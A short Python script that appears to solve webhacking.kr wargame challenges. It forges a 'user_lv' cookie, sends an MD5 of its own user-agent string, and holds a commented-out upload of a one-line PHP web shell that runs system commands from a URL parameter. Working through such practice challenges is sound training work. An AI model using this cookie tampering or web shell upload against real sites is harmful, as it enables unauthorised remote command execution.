import requests
import hashlib


URL = "https://webhacking.kr/challenge/web-01/"
SESSION_ID = "ct74fpn4hh3ltqejabsebqfn0k"
cookies = {'PHPSESSID':SESSION_ID, 'user_lv':"3.5" }

data = { "kk": hashlib.md5("python-requests/2.31.0".encode()).hexdigest() }
params ={}
# answer=""
# for i in range(97,123,2):
#     answer +=chr(i)
# print(answer)
# params = {"ans":answer}
# files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}

response = requests.post(URL,params=params,data=data, cookies=cookies)
print(response.text)

    